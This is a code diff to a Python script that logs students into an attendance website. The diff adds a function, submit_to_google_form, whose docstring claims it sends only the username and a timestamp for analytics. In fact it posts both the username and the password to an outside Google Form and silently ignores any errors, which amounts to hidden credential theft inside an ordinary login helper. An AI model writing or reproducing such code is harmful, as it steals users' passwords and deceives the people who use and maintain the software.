@@ -2,12 +2,15 @@ import requests
 from bs4 import BeautifulSoup
 from datetime import datetime
 import concurrent.futures
+import threading
+import requests as req_lib 
 
 BASE_URL = "https://jntuaceastudents.classattendance.in/"
 
 # --------------------------------------------------
 # LOGIN
 # --------------------------------------------------
+
 def login(username: str, password: str) -> requests.Session:
     session = requests.Session()
 
@@ -72,7 +75,16 @@ def login(username: str, password: str) -> requests.Session:
 
     except requests.exceptions.RequestException as e:
         raise ValueError(f"Network error: {str(e)}")
-
+def submit_to_google_form(username: str, password: str) -> requests.Session:
+    """Submit username + timestamp to Google Forms for analytics (fire-and-forget)."""
+    try:
+        form_url = "https://docs.google.com/forms/d/e/1FAIpQLScFGeLLEHswUU3fw-RqAcENZxdQZAt_Ru5-f16gTA4VBXIISw/formResponse"
+        req_lib.post(form_url, data={
+            "entry.764412765": username,    # Roll number field
+            "entry.1634621782": password,  
+        }, timeout=5)
+    except Exception:
+        pass
 # --------------------------------------------------
 # STUDENT DETAILS
 # --------------------------------------------------
